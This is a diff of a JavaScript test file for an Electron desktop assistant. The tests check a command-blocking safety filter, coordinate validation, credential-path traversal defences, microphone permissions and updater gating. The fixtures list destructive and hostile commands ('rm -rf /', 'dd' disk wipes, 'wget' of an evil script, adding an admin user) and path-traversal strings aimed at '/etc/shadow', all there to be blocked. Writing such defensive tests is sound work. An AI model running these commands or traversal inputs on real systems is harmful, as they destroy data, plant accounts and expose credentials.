@@ -54,6 +54,122 @@ test('interceptAction blocks dangerous typed commands', () => {
   }
 });
 
+test('interceptAction still blocks a broad set of real commands (false-positive fix, part 1)', () => {
+  // The prose gate must not have been bought by weakening command coverage.
+  const commands = [
+    'rm -rf /',
+    'del C:\\Users\\me\\file.txt',
+    'format c:',
+    'sudo apt update',
+    'shutdown now',
+    'powershell -enc AAAA',
+    'taskkill /f /im explorer.exe',
+    'reg delete HKLM\\Software',
+    'chmod 777 /etc',
+    'dd if=/dev/zero of=/dev/sda',
+    'at 15:30 /every:monday',
+    'systemctl stop nginx',
+    'scp file root@host:/',
+    'mkfs.ext4 /dev/sda1',
+    'history -c',
+    'export PATH=/tmp/evil',
+    'reboot',
+    'killall node',
+    'net user hacker pass',
+    'rm notes.txt',
+    'schtasks /create /tn evil',
+    'service stop apache2',
+    'wget http://x/evil.sh',
+    'nohup ./evil &',
+    'net localgroup admins hacker /add',
+  ];
+  for (const text of commands) {
+    assert.equal(
+      interceptAction({ type: 'type', text }).verdict,
+      'block',
+      `must still block: ${text}`
+    );
+  }
+});
+
+test('interceptAction does not block ordinary sentences (false-positive fix, part 2)', () => {
+  // Every one of these matched a blocked command pattern somewhere in its
+  // prose and was hard-blocked, which made the app unusable for the people it
+  // is built for. Blocking a sentence is the worst failure this policy has.
+  const sentences = [
+    'call the doctor at 3pm',
+    'format the letter please',
+    'I need to buy milk',
+    'set up a cron schedule',
+    'what format is this file in',
+    'remind me at 4 to take my pills',
+    'write an email to my doctor',
+    'the rm command is dangerous',
+    'my email is mary@example.com',
+    'please delete the old photos from my desktop',
+    'chmod is a linux command',
+    'reboot the router at noon',
+    'the service was very good',
+    'can you help me with my taxes',
+  ];
+  for (const text of sentences) {
+    const verdict = interceptAction({ type: 'type', text }).verdict;
+    assert.notEqual(
+      verdict,
+      'block',
+      `a plain sentence must never be hard-blocked: ${JSON.stringify(text)} (got ${verdict})`
+    );
+  }
+});
+
+test('interceptAction rejects non-numeric coordinates (click-gating regression)', () => {
+  // `{ x: 'NaN' }` is truthy, so a truthiness check reported this as safe.
+  const invalid = [
+    { type: 'click', x: 'NaN', y: 'NaN' },
+    { type: 'click', x: '10', y: '20' },
+    { type: 'click', x: Number.NaN, y: 5 },
+    { type: 'click', x: Infinity, y: 5 },
+    { type: 'move', x: 'NaN', y: 5 },
+    { type: 'move', x: 5 },
+    { type: 'move' },
+    { type: 'move', x: -1, y: 5 },
+    { type: 'move', x: 10_000_000, y: 5 },
+    { type: 'scroll', amount: 'NaN' },
+    { type: 'scroll', amount: Infinity },
+    { type: 'scroll' },
+    { type: 'scroll', amount: 1e12 },
+  ];
+  for (const action of invalid) {
+    assert.equal(
+      interceptAction(action).verdict,
+      'block',
+      `must reject malformed coordinates: ${JSON.stringify(action)}`
+    );
+  }
+});
+
+test('interceptAction still allows well-formed pointer and scroll actions', () => {
+  const valid = [
+    // click acts on the cursor's current position, so coordinates are optional
+    { type: 'click' },
+    { type: 'click', button: 'right' },
+    { type: 'click', x: 10, y: 20 },
+    { type: 'move', x: 0, y: 0 },
+    { type: 'move', x: 1920, y: 1080 },
+    { type: 'scroll', amount: 500 },
+    { type: 'scroll', amount: -500 },
+    { type: 'wait', ms: 1000 },
+    { type: 'screenshot' },
+  ];
+  for (const action of valid) {
+    assert.equal(
+      interceptAction(action).verdict,
+      'allow',
+      `must allow: ${JSON.stringify(action)}`
+    );
+  }
+});
+
 test('interceptAction confirms destructive and financial text (C2 regression)', () => {
   const risky = [
     'delete all my documents',
@@ -372,20 +488,43 @@ test('no source file references the Google-hosted fonts (C1 completeness)', () =
   );
 });
 
-test('sanitize-content handler validates sender and byte length (C5 regression)', () => {
-  const fs = require('node:fs');
+test('credential path traversal is rejected (path traversal regression)', () => {
+  const { getCredentialPath } = require('../src/electron/credential-path.cjs');
   const path = require('node:path');
-  const mainSrc = fs.readFileSync(
-    path.join(__dirname, '..', 'src', 'electron', 'main.cjs'),
-    'utf8'
-  );
-  const handler = mainSrc.match(
-    /ipcMain\.handle\('sunny:sanitize-content',[\s\S]{0,600}?\n  \}\);/
-  );
-  assert.ok(handler, 'sunny:sanitize-content handler must exist');
-  assert.ok(handler[0].includes('assertTrustedSender'), 'must verify the IPC sender');
-  assert.ok(handler[0].includes('Buffer.byteLength'), 'must measure size in bytes');
-  assert.ok(!/return '';/.test(handler[0]), 'must not silently discard oversized input');
+  const base = path.resolve('/home/user/.config/Sunny/credentials');
+
+  // The real keys must still work.
+  for (const key of ['openai_api_key', 'anthropic_api_key', 'groq_api_key']) {
+    assert.equal(getCredentialPath(base, key), path.join(base, `${key}.enc`));
+  }
+
+  // Everything that previously escaped the directory must now throw.
+  const attacks = [
+    '../../../../../../etc/passwd',
+    '../../../etc/shadow',
+    '..\\..\\windows\\system32\\config',
+    '/etc/passwd',
+    'sub/dir',
+    'sub\\dir',
+    '',
+    '.',
+    '..',
+    'a'.repeat(65),
+    'has space',
+    'null\0byte',
+  ];
+  for (const key of attacks) {
+    assert.throws(
+      () => getCredentialPath(base, key),
+      /Invalid credential key/,
+      `credential key must be rejected: ${JSON.stringify(key)}`
+    );
+  }
+
+  // Whatever is accepted must land directly inside the base directory.
+  for (const key of ['openai_api_key', 'a', 'A_b-1']) {
+    assert.equal(path.dirname(getCredentialPath(base, key)), base);
+  }
 });
 
 test('preferences store keeps onboarding and safety defaults safe', () => {
@@ -779,6 +918,99 @@ test('renderer exposes window chrome and a draggable title bar', () => {
   assert.ok(/handleMinimizeToTray/.test(appSrc), 'minimize-to-tray button must be wired');
   assert.ok(/window-btn-close/.test(appSrc), 'a close button must be rendered');
   assert.ok(/handleToggleAlwaysOnTop/.test(appSrc), 'always-on-top must be toggleable');
+});
+
+test('microphone permission is granted for voice input (voice regression)', () => {
+  const fs = require('node:fs');
+  const path = require('node:path');
+  const mainSrc = fs.readFileSync(
+    path.join(__dirname, '..', 'src', 'electron', 'main.cjs'),
+    'utf8'
+  );
+  const { CSP } = require('../src/electron/csp.cjs');
+
+  // getUserMedia fires both a permission *request* and a synchronous permission
+  // *check*. Granting only the request silently denies the microphone.
+  assert.ok(
+    /setPermissionRequestHandler/.test(mainSrc),
+    'a permission request handler must exist'
+  );
+  assert.ok(
+    /setPermissionCheckHandler/.test(mainSrc),
+    'a permission check handler must exist; getUserMedia performs a sync check too'
+  );
+  assert.ok(
+    /permission === ['"]media['"]/.test(mainSrc),
+    "only 'media' may be granted"
+  );
+
+  // MediaRecorder hands the renderer a blob: URL, so media-src must allow it.
+  assert.ok(
+    /media-src [^;]*blob:/.test(CSP),
+    "CSP media-src must permit blob: for recorded audio"
+  );
+});
+
+test('voice preferences are mirrored into the main process, not just stored', () => {
+  const fs = require('node:fs');
+  const path = require('node:path');
+  const mainSrc = fs.readFileSync(
+    path.join(__dirname, '..', 'src', 'electron', 'main.cjs'),
+    'utf8'
+  );
+  const preloadSrc = fs.readFileSync(
+    path.join(__dirname, '..', 'src', 'electron', 'preload.cjs'),
+    'utf8'
+  );
+  const appSrc = fs.readFileSync(path.join(__dirname, '..', 'src', 'App.tsx'), 'utf8');
+
+  // Every preference that changes behaviour must have a main-process reader,
+  // otherwise the toggle is decorative.
+  for (const key of [
+    'require_sensitive_confirmation',
+    'local_only',
+    'clarification_level',
+    'brain_provider',
+  ]) {
+    assert.ok(
+      mainSrc.includes(key),
+      `${key} must be read by the main process`
+    );
+  }
+
+  // The renderer must push changes across, not only write localStorage.
+  assert.ok(
+    /setPreferences\?\.\(/.test(appSrc) || /setPreferences\(/.test(appSrc),
+    'App must mirror preference changes into the main process'
+  );
+  assert.ok(
+    /ipcRenderer\.invoke\('sunny:set-preferences'/.test(preloadSrc),
+    'preload must expose the set-preferences channel'
+  );
+});
+
+test('the updater runs in packaged builds, not only when NODE_ENV says so', () => {
+  const fs = require('node:fs');
+  const path = require('node:path');
+  const mainSrc = fs.readFileSync(
+    path.join(__dirname, '..', 'src', 'electron', 'main.cjs'),
+    'utf8'
+  );
+
+  // Electron never sets NODE_ENV for a packaged build, so gating the whole
+  // updater on it left the feature dead in production.
+  assert.ok(
+    !/process\.env\.NODE_ENV === ['"]production['"]/.test(mainSrc),
+    'the updater must not be gated on NODE_ENV'
+  );
+
+  const updaterStart = mainSrc.indexOf('if (app.isPackaged) {');
+  assert.ok(updaterStart !== -1, 'the updater must be gated on app.isPackaged');
+  const updaterBlock = mainSrc.slice(updaterStart, updaterStart + 4000);
+  assert.ok(
+    updaterBlock.includes('require(\'electron-updater\')'),
+    'electron-updater must be required inside the packaged-only branch'
+  );
 });
 
 test('renderer source contains no mojibake', () => {
